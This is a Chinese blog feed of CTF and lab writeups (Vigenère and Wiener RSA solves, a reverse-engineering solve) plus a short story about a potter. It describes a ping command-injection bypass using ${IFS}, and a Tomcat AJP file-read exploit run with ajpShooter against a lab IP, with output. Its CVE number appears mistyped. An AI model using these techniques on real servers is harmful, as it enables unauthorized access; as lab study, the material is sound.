class="line">52</span><br></pre></td><td class="code"><pre><span class="line">ALPHABET = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7F</span>)])</span><br><span class="line">ALPHABET_SIZE = <span class="built_in">len</span>(ALPHABET)</span><br><span class="line">enc=<span class="string">&quot;u_LcYsM^UWeM[XhIX[`&lt;Q^eb@__pY]%&quot;</span></span><br><span class="line">plain=<span class="string">&quot;Hello,good morning!How are you?&quot;</span></span><br><span class="line">key=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    key+=<span class="built_in">chr</span>(<span class="number">0x20</span>+(<span class="built_in">ord</span>(enc[i])-<span class="built_in">ord</span>(plain[i])%ALPHABET_SIZE))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key=<span class="string">&quot;My_vigenere_key_is_safe!&quot;</span></span><br><span class="line">TRIGGER = <span class="string">&quot;I&#x27;m fine,thank you!&quot;</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char_index</span>(<span class="params">ch: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;字符 -&gt; 在 94 字符表中的索引&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(ch) - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_char</span>(<span class="params">idx: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;索引 -&gt; 对应字符（自动循环）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>((idx % ALPHABET_SIZE) + <span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_enc</span>(<span class="params">plain: <span class="built_in">str</span>, key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;维吉尼亚加密（可见字符版）&quot;&quot;&quot;</span></span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(plain):</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:           <span class="comment"># 非可见字符原样保留</span></span><br><span class="line">            cipher.append(ch)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        k = key[i % <span class="built_in">len</span>(key)]            <span class="comment"># 密钥循环使用</span></span><br><span class="line">        shift = char_index(k)            <span class="comment"># 密钥字符对应的偏移量</span></span><br><span class="line">        new_idx = (char_index(ch) + shift) % ALPHABET_SIZE</span><br><span class="line">        cipher.append(index_char(new_idx))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(cipher)</span><br><span class="line"><span class="built_in">print</span>(vigenere_enc(TRIGGER,key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;4fA^e^vVxaxR~E+SI4?[Ty&amp;u-]RpZ\\uNx&#x27;MDRw-R&#125;kEq&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_dec</span>(<span class="params">cipher: <span class="built_in">str</span>, key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;维吉尼亚解密（可见字符版）&quot;&quot;&quot;</span></span><br><span class="line">    plain = []</span><br><span class="line">    <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher):</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:           <span class="comment"># 非可见字符原样保留</span></span><br><span class="line">            plain.append(ch)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        k = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">        shift = char_index(k)</span><br><span class="line">        new_idx = (char_index(ch) - shift) % ALPHABET_SIZE</span><br><span class="line">        plain.append(index_char(new_idx))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(plain)</span><br><span class="line"><span class="built_in">print</span>(vigenere_dec(flag,key))</span><br><span class="line"><span class="comment">#flag&#123;v1g3n3r3_1s_@_gr3@t_crypt0_34gdf23r4we&#125;</span></span><br></pre></td></tr></table></figure><h3 id="js">js!!!!</h3><p>jsfuck</p><figure><imgsrc="../images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927145428374.png"alt="image-20250927145428374" /><figcaption aria-hidden="true">image-20250927145428374</figcaption></figure><h3 id="维纳攻击">维纳攻击</h3><p>标准的维纳攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x,y</span>):</span><br><span class="line">    cf=[]</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x//y)</span><br><span class="line">        x,y=y,x%y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator=<span class="number">0</span></span><br><span class="line">    denominator=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator=denominator,x*denominator+numerator</span><br><span class="line">    <span class="keyword">return</span> numerator,denominator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    par=gmpy2.isqrt(b*b-<span class="number">4</span>*a*c)</span><br><span class="line">    <span class="keyword">return</span> (-b+par)//(<span class="number">2</span>*a),(-b-par)//(<span class="number">2</span>*a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(cf)+<span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e,n</span>):</span><br><span class="line">    cf=continuedFra(e,n)</span><br><span class="line">    gf=getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d,k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">0</span>:<span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e*d-<span class="number">1</span>)%k!=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi=(e*d-<span class="number">1</span>)//k</span><br><span class="line">        p,q=solve_pq(<span class="number">1</span>,n-phi+<span class="number">1</span>,n)</span><br><span class="line">        <span class="keyword">if</span> p*q==n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">n= <span class="number">91510509432781975760096107767377368031971006305898876524065398755888465048733880775248518816640444331620686600617734933883674520683631664424444216875152972385753603001698383568597237868613120918436955398079663009003724465724879507817731759285758460762662824164026500606884671511702262581388638282794890192027</span></span><br><span class="line">e= <span class="number">26135083049930915264766519621014938119816864463605449201859665226084899098214765205357516917163302642828133788920140812606329233832519835056759832222374744306721856126632867337922339606510596531565510906786609997470993555429532739371539100062164271943073972387884530377949557546032895161688788115133699375651</span></span><br><span class="line">c= <span class="number">89474432234398707693013252794312396821604378051286372242798907187393288884658352126237918243202321235275486653344125988170718123195724674942704448081894833467667853715908719921049714079134833467442977053354875447786201963904815858599906088447249628150423378791886049597071980521393184316411224694315578400683</span></span><br><span class="line">d=wienerAttack(e,n)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;20d61a61-c5dc-4629-9f44-bd885eb3e980&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="web">Web</h2><h3 id="ping">ping</h3><p>ping命令注入，空格用${IFS}绕，关键词用，无回显就写到文件里读</p><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927145116152.png"alt="image-20250927145116152" /><figcaption aria-hidden="true">image-20250927145116152</figcaption></figure><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927145132001.png"alt="image-20250927145132001" /><figcaption aria-hidden="true">image-20250927145132001</figcaption></figure><h2 id="reverse">Reverse</h2><h3 id="ez_re">ez_re</h3><p>加密逻辑就是()((i&lt;&lt;4)|(i&gt;&gt;4))^0x55)&amp;0xff</p><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927145716297.png"alt="image-20250927145716297" /><figcaption aria-hidden="true">image-20250927145716297</figcaption></figure><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927145823609.png"alt="image-20250927145823609" /><figcaption aria-hidden="true">image-20250927145823609</figcaption></figure><p>写脚本打表解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="number">0x33</span>,<span class="number">0x93</span>,<span class="number">0x43</span>,<span class="number">0x23</span>,<span class="number">0xe2</span>,<span class="number">0xc0</span>,<span class="number">0x56</span>,<span class="number">0x2</span>,<span class="number">0xa0</span>,<span class="number">0x51</span>,<span class="number">0x72</span>,<span class="number">0x3</span>,<span class="number">0xa0</span>,<span class="number">0x23</span>,<span class="number">0x72</span>,<span class="number">0x3</span>,<span class="number">0x51</span>,<span class="number">0x12</span>,<span class="number">0xa0</span>,<span class="number">0x63</span>,<span class="number">0x12</span>,<span class="number">0x33</span>,<span class="number">0x66</span>,<span class="number">0x72</span>,<span class="number">0x82</span>]</span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    dic[(((i&lt;&lt;<span class="number">4</span>)|(i&gt;&gt;<span class="number">4</span>))^<span class="number">0x55</span>)&amp;<span class="number">0xff</span>]=<span class="built_in">chr</span>(i)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    flag+=dic[i]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_@re_gre@t_ctf3r&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc">Misc</h2><h3 id="wherebx">wherebx</h3><p>从流量中提取到一张图片</p><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/download.jpg"alt="download" /><figcaption aria-hidden="true">download</figcaption></figure><p>看到一段加密逻辑，用的是AES-128-ECB</p><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927150734064.png"alt="image-20250927150734064" /><figcaption aria-hidden="true">image-20250927150734064</figcaption></figure><p>找到flag</p><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927150903686.png"alt="image-20250927150903686" /><figcaption aria-hidden="true">image-20250927150903686</figcaption></figure><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927150917523.png"alt="image-20250927150917523" /><figcaption aria-hidden="true">image-20250927150917523</figcaption></figure><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927150932158.png"alt="image-20250927150932158" /><figcaption aria-hidden="true">image-20250927150932158</figcaption></figure><h3 id="一段密文">一段密文</h3><p>rot47+base64</p><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927150629142.png"alt="image-20250927150629142" /><figcaption aria-hidden="true">image-20250927150629142</figcaption></figure><h3 id="logo">logo</h3><p>zsteg一把梭</p><figure><imgsrc="/images/江苏移动赋能建功网络安全技能竞赛-个人赛-Writeup/image-20250927150523906.png"alt="image-20250927150523906" /><figcaption aria-hidden="true">image-20250927150523906</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 江苏移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《青瓷》</title>
      <link href="/posts/6f50e666/"/>
      <url>/posts/6f50e666/</url>
      
        <content type="html"><![CDATA[<p>​秋深了，枫叶如血，一片片坠落在青石阶上，像被风撕碎的旧信笺。山间古寺静谧，檐角悬着铜铃，偶有风过，便发出几声清冷的颤音。</p><p>​寺后有一园，名“松雪”，传为百年前一位制瓷大家所建。园中植松数株，枝干虬曲，雪松落针成毯，覆于泥土之上，年复一年，腐化为泥，滋养着地底沉睡的瓷土。园心一亭，名“澄怀”，亭中常坐一人，着素麻长衫，手执刻刀，在一方未烧之坯上细细雕琢。</p><p>​此人姓林，名砚舟，世人称他“松雪先生”。他并非生来便是大师。十年前，他曾是个在园外徘徊的少年，衣衫粗劣，眼神怯懦，只因偶然拾得一块残瓷，慕名而来，叩响寺门。那时，是另一个人收留了他——老匠人沈观白。</p><p>​沈观白不善言辞，却极重技艺。他教林砚舟辨土、揉泥、拉坯、施釉、刻纹，乃至火候的呼吸节奏。他常说：“瓷是有魂的，它记得每一双手的温度。”那些年，林砚舟日日跪坐泥前，十指皴裂，指甲缝里嵌着洗不去的陶尘。沈观白从不催促，只在他失误时轻轻摇头，再示范一次。</p><p>​十年光阴，林砚舟终于烧出第一件“雪胎青”——釉色如初雪覆于冰肌，光线下流转幽蓝，似有月华凝于其上。世人惊为天工，争相传颂。而沈观白只是伫立窑前，目光沉静地抚过那瓷壁，良久，才低声叹道：“此釉清透如泉，胎骨匀净，确是难得……”他顿了顿，目光掠过林砚舟脸上那抑制不住的得意，遂缓缓闭口。</p><p>​ 林砚舟笑容微滞，却只当是赞语中的余韵，未加细思。</p><p>​后来，沈观白决意远行，寻访古窑遗法，归期未定。临行前，他召林砚舟至澄怀亭，立于窑口前，将那枚旧刻刀递出——刀柄磨得发亮，是当年亲手所赠。“园中诸事，你已熟稔，”他语气平静，“我走后，由你主持，望不负松雪之名。”</p><p>​林砚舟垂首，略作推辞：“弟子资历尚浅，恐难服众……”话未说完，双手却已稳稳接住刀柄。他抬头时，眼底闪过一丝不易察觉的笃定，仿佛接过并非重托，而是迟来已久的加冕。沈观白默然凝望片刻，终是转身离去，背影没入山径，再未回头。</p><p>​自那日起，林砚舟正式入驻“澄怀亭”。他不再亲手制坯，只端坐于紫檀椅上，指点他人。园中新来的学徒，皆要向他请教技法。有人问：“先生，为何我施釉总厚薄不均？”他轻笑：“你眼拙，心浮，尚未得‘静观’之境。”又有人问：“火候如何把握？”他拂袖道：“此乃心传，非口授可得。”</p><p>​每逢新瓷出炉，若成品平平，他便淡然道：“技艺未成，不足为外人道。”若成品惊艳，则必对宾客言：“此乃我亲定釉方，督窑三日，方得此物。”仿佛那泥、那火、那千年松雪之精魄，皆听命于他一人。</p><p>​园中老仆清扫亭台，在蒲团下拾得一页残稿。纸上字迹清瘦，是沈观白的手笔：</p><blockquote><p>​“今日砚舟试釉失败，坯体尽裂。然其纹路竟意外成冰裂之效，错中有美，或可开新境。嘱其勿弃，反覆试验。彼初不解，以为挫败。吾示以古籍‘无心插柳’之例，终悟。少年心性，贵在可塑。望其日后，莫以己见蔽天地之巧。”</p></blockquote><p>​ 老仆叹息，将纸折好，藏入袖中。</p><p>​又逢大典，京都藏家云集，争赏新出“雪胎青”。林砚舟立于高台，广袖飘然，正欲开口颂瓷，忽闻一声轻咳。</p><p>​沈观白不知何时已至，扶杖而立。他并未走近展台，只是静立于庭前古松的阴影里，目光缓缓扫过那一排排被冠以“天工”“神韵”之名的瓷器，扫过林砚舟眉宇间挥之不去的倨傲，扫过学徒们低头垂目的拘谨——他们曾敢问、敢试、敢错，如今却只敢执笔记录，连呼吸都放得极轻。</p><p>​他缓步上前，声音低而沉，如风过窑隙：“砚舟，我见你对新人，动辄讥其‘未得门径’‘不堪点拨’。可你忘了，你第一次问‘为何泥会裂’时，也不过是个连揉泥都会伤手的少年。技艺之传，不在高坐授命，而在俯身解惑。若园中再无提问之声，那便不是传承，是寂灭。”</p><p>​林砚舟笑容微敛，眉峰轻蹙，目光却未落于师父，而是掠过他肩头，投向满堂宾客的赞叹。他唇角一扬，朗声道：“诸位请看，此釉凝光含曜，乃我闭关三日，独悟之法——”</p><p>​他话音未落，再回头时，沈观白已悄然退步，转身走入庭外薄雾之中。青石小径蜿蜒入林，他的背影渐淡，如墨入水，无声无痕。</p><p>此后，再无人见过沈观白。</p><p>​然而，林砚舟并未因此收敛。相反，自那日之后，他开始了一场不动声色的清洗。</p><p>​先是园中。他命人将沈观白曾居的茅屋彻底翻修，墙垣推倒，旧器尽毁。那些曾被奉为圭臬的笔记、釉方、手绘图谱，被他一一取出，锁入箱笼，再以“虫蛀霉变”为由，命人焚于后山窑灰坑中。老仆欲劝，却被逐出园外。</p><p>​接着是人。他在园中设宴，召集所有弟子，举杯笑道：“诸位可知，我初来松雪园时，不过一介寒门少年，无名无资，全凭一腔热忱。可沈师……”他语气微顿，继而轻叹，“他从不直言教诲，只以冷眼相待，动辄讥讽。我拉坯稍偏，他便冷笑‘泥都握不住，还想成器？’；我试釉失败，他不授其法，反斥我‘朽木难雕，不如归去’。”</p><p>​他摇头叹息，目光低垂，仿佛陷入往事之痛：“十年间，我日日跪坐泥前，十指皴裂，夜守窑火，稍有差池，便是羞辱。他从不赞一言，只以苛责为‘磨心’。如今想来，所谓‘严师’，不过是以弱者之苦，成其威权之乐。”</p><p>​他环视众人，语气温和却坚定：“我今日立此誓——松雪园不再有‘跪着学艺’的徒弟。你们可以错，可以问，可以争。因为真正的传承，是光，不是影。”</p><p>​林砚舟继续道：“更甚者，沈师晚年早已不事劳作。园中瓷土调配、窑火调控、新釉研发，皆由我一人日夜摸索。他不过日日静坐澄怀亭，品茶观松，将园中重担尽数推于我肩。我非怨之，只愿后人明白——今日‘雪胎青’之成，非承旧法，乃破茧而出。”</p><p>​他隐去了自己初来时连揉泥都会伤手的笨拙，隐去了十年间无数次失败后跪地痛哭的夜晚，隐去了沈观白默默为他重烧七次废坯的辛劳。他将“雪胎青”的诞生，描绘成一场孤勇者的突围，而沈观白，不过是挡路的旧影。</p><p>​更令人震惊的是，他悄然遣人赴京、走闽、下粤，散布流言：说沈观白早年借“寻访古窑”之名游山玩水，实则荒废园务；说他性情乖戾，以“心传”为由拒授真法，只为掌控弟子；说他离园非为求道，实为厌倦琐务，甩手而去，留下林砚舟一人独撑危局。</p><p>​市井之间，竟有说书人绘声绘色：“那沈老儿，日日躺在亭中晒太阳，茶不离手，活像庙里泥胎，全靠那林公子起早贪黑，才保住松雪园名声！”</p><p>​而这一切发生之时，沈观白正在西南边陲的一座无名小镇。他租住一间土屋，门前种了几株野菊，每日用最普通的陶土捏些粗碗小盏，送给邻家孩童。偶有识货之人登门求见，他只微笑摇头：“我早已不是什么匠人，不过是个烧泥巴的老人。”</p><p>​一日黄昏，他坐在院中，见远处集市上有商贩叫卖“松雪真传·雪胎青”瓷瓶，标价千金。他凝望良久，终是轻轻叹了口气，起身回屋，继续打磨手中那只歪斜的小陶鸭。</p><p>​某个雨后的清晨，林砚舟从梦中惊醒。梦中，他看见沈观白站在窑口，背对着他，手中捧着一件从未见过的瓷器——通体素净，无纹无饰，却仿佛蕴藏着整座松雪园的呼吸。他想上前，却一步也迈不动。</p><p>​他睁开眼，晨光微亮，案上摊着昨夜写就的“瓷论”手稿，洋洋万言，末尾一句墨迹未干：</p><blockquote><p>“凡器之成，皆因我法之妙……”</p></blockquote><p>​地上，几张散落的稿纸被夜露打湿，墨字晕染开来，如泪，如血，如一场无声的崩解。</p><p>​林砚舟皱了皱眉，拾起湿透的纸页，随手投入炉中。火舌吞没字迹，他转身望向园中——学徒们正低头忙碌，无人抬头。他整了整衣袖，重新坐回紫檀椅上，轻咳一声，道：“今日试釉，谁主窑？”</p><p>​ 无人应答。</p><p>​ 良久，一个年轻学徒怯生生道：“回先生，是陈师傅守了整夜。”</p><p>​林砚舟颔首，淡淡道：“嗯。此釉清透，确是难得。可见督窑之人，眼光不俗。”</p><p>​ 他望着窗外，天光灰白，松影斑驳。他知道，这园子终究是他的了。</p><p>​ 可不知为何，那枚刻刀的冷意，却始终缠在指尖，不肯散去。</p><p>​在千里之外的小镇，沈观白将那只烧好的小陶鸭递给邻家孩子。孩子欢喜跳跃，不小心摔在地上，陶鸭碎裂。他蹲下身，一片片拾起，忽然笑了：“裂得好，裂得好啊……天地从不完美，人才妄想圆满。”</p><p>​他将碎片收入布袋，轻轻拍了拍，转身走进暮色。他知道，有些东西烧过了，就再也回不去了。</p>]]></content>
      
      
      <categories>
          
          <category> Literature </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小说 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湾区杯2025 Writeup</title>
      <link href="/posts/9ae29dfc/"/>
      <url>/posts/9ae29dfc/</url>
      
        <content type="html"><![CDATA[<blockquote><p>仍然是跟校队打的，成功进线下</p><p>这个九月要到处奔波咯 :)</p></blockquote><h4 id="初赛writeup点我"><ahref="https://www.blog.st4rr.top/writeups/湾区杯2025初赛Writeup.pdf">初赛Writeup点我</a></h4><p>决赛实在是难绷，开局就把自己的电脑整废了，没错我就是这次的小丑之一()</p><p>后来拿队友的电脑打，做了两个题，好歹也算是有所贡献了(</p><p>又是差一点点拿到人才证书，还是太菜了((</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 湾区杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇剑杯2025 Writeup</title>
      <link href="/posts/9ec42e56/"/>
      <url>/posts/9ec42e56/</url>
      
        <content type="html"><![CDATA[<blockquote><p>跟校队打的，也是成功进线下了</p><p><del>什么陇抬头大赛</del></p></blockquote><h4 id="初赛writeup点我"><ahref="https://www.blog.st4rr.top/writeups/陇剑杯2025初赛Writeup.pdf">初赛Writeup点我</a></h4><p>在半决赛做了几个渗透，又成功进了决赛 :)</p><p>决赛给的获奖名额太少了，差五名就能获奖了，大概一道题的差距吧，有些可惜:(</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 陇剑杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>磐石行动2025 Writeup</title>
      <link href="/posts/71620e38/"/>
      <url>/posts/71620e38/</url>
      
        <content type="html"><![CDATA[<blockquote><p>跟校队一起看的题，成功给校队送进决赛:)</p><p>其中的复赛也是我第一次打渗透赛()</p></blockquote><h4 id="初赛writeup点我"><ahref="https://www.blog.st4rr.top/writeups/磐石行动2025初赛Writeup.pdf">初赛Writeup点我</a></h4><h4 id="复赛writeup点我"><ahref="https://www.blog.st4rr.top/writeups/磐石行动2025复赛Writeup.pdf">复赛Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 磐石行动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境 Spoofing</title>
      <link href="/posts/8fef63f6/"/>
      <url>/posts/8fef63f6/</url>
      
        <content type="html"><![CDATA[<p>先上fscan扫一波</p><figure><imgsrc="/images/春秋云境-Spoofing/1754365668451-c11bcaf3-fdc8-42d7-a605-1db39c19c245.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>扫目录</p><figure><imgsrc="/images/春秋云境-Spoofing/1754365856365-4804fb33-2033-45d0-a6e0-de73f62a9fd0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>访问docs目录，发现是Tomcat 9.0.30</p><figure><imgsrc="/images/春秋云境-Spoofing/1754365918776-13c35b30-ccfb-456a-b82f-d3f87213b9f0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里存在CVE-2020-1983 Tomcat</p><p>用现成的exp打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\jyzho\OneDrive\桌面&gt;python3 ajpShooter.py http://39.98.119.136:8080 8009  /WEB-INF/web.xml read</span><br><span class="line"></span><br><span class="line">       _    _         __ _                 _</span><br><span class="line">      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __</span><br><span class="line">     //_\\ | | &#x27;_ \  \ \| &#x27;_ \ / _ \ / _ \| __/ _ \ &#x27;__|</span><br><span class="line">    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |</span><br><span class="line">    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|</span><br><span class="line">         |__/|_|</span><br><span class="line">                                                00theway,just for test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[&lt;] 200 200</span><br><span class="line">[&lt;] Accept-Ranges: bytes</span><br><span class="line">[&lt;] ETag: W/&quot;2489-1670857638305&quot;</span><br><span class="line">[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT</span><br><span class="line">[&lt;] Content-Type: application/xml</span><br><span class="line">[&lt;] Content-Length: 2489</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="line"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><span class="line"></span><br><span 